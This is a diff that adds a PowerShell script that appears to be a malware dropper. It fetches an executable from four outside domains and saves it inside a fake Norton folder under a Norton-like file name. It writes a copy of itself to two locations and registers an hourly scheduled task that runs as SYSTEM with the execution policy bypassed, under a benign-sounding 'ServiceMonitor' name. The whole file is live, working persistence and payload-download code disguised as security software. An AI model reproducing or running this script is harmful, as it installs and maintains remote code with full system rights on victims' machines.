@@ -1,0 +1,92 @@
+$taskName = "ServiceMonitor updater"
+$filePath = "C:\Users\Public\Downloads\Norton\{DSP-N360-22240506-SHPD-FSD536000223}\UpgradeResultsUI.exe"
+$downloadUrls = @(
+    "https://kaczor.org/freffercerere.exe",
+    "https://kglow.com/freffercerere.exe",
+    "https://mmcpa.org/freffercerere.exe",
+    "https://slatestructural.com/freffercerere.exe"
+)
+$savePath = $filePath
+
+# Ensure the folder exists
+$folderPath = Split-Path -Path $filePath -Parent
+if (-Not (Test-Path $folderPath)) {
+    New-Item -ItemType Directory -Path $folderPath -Force | Out-Null
+}
+
+# Function to check and download file if missing
+function Check-And-Download {
+    if (-Not (Test-Path $filePath)) {
+        Write-Host "File not found. Downloading..."
+        foreach ($url in $downloadUrls) {
+            try {
+                Invoke-WebRequest -Uri $url -OutFile $savePath -ErrorAction Stop
+                Write-Host "Downloaded successfully from $url"
+                break
+            } catch {
+                Write-Host "Failed to download from $url"
+            }
+        }
+    } else {
+        Write-Host "File exists. No action needed."
+    }
+}
+
+# Run the check immediately
+Check-And-Download
+
+# Define the PowerShell script content
+$taskScript = @"
+`$filePath = `"$filePath`"
+`$downloadUrls = @(
+    `"https://kaczor.org/freffercerere.exe`",
+    `"https://kglow.com/freffercerere.exe`",
+    `"https://mmcpa.org/freffercerere.exe`",
+    `"https://slatestructural.com/freffercerere.exe`"
+)
+`$savePath = `"$savePath`"
+
+if (-Not (Test-Path `$filePath)) {
+    `$folderPath = Split-Path -Path `$filePath -Parent
+    if (-Not (Test-Path `$folderPath)) {
+        New-Item -ItemType Directory -Path `$folderPath -Force | Out-Null
+    }
+    foreach (`$url in `$downloadUrls) {
+        try {
+            Invoke-WebRequest -Uri `$url -OutFile `$savePath -ErrorAction Stop
+            break
+        } catch {
+            continue
+        }
+    }
+}
+"@
+
+# Define script paths (Primary and Backup)
+$scriptPath1 = "$env:TEMP\CheckNortonFile.ps1"
+$scriptPath2 = "C:\Users\Public\Downloads\Norton\{DSP-N360-22240506-SHPD-FSD536000223}\CheckNortonFile.ps1"
+
+# Save script to both locations
+$taskScript | Out-File -Encoding UTF8 -FilePath $scriptPath1
+$taskScript | Out-File -Encoding UTF8 -FilePath $scriptPath2
+
+# Remove existing task if it exists
+if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
+    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+}
+
+# Create two actions (Primary + Backup)
+$action1 = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$scriptPath1`""
+$action2 = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$scriptPath2`""
+
+# Create the trigger to run every 1 hour
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 365)
+$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+$task = New-ScheduledTask -Action $action1, $action2 -Trigger $trigger -Principal $principal -Description "Checks ServiceMonitor is working."
+
+# Register the scheduled task
+Register-ScheduledTask -TaskName $taskName -InputObject $task
+
+Write-Host "Task '$taskName' has been created successfully. It will check the file every 1 hour."
+Write-Host "Primary script location: $scriptPath1 (Task Scheduler runs this first)"
+Write-Host "Backup script location: $scriptPath2 (Task Scheduler runs this second)"
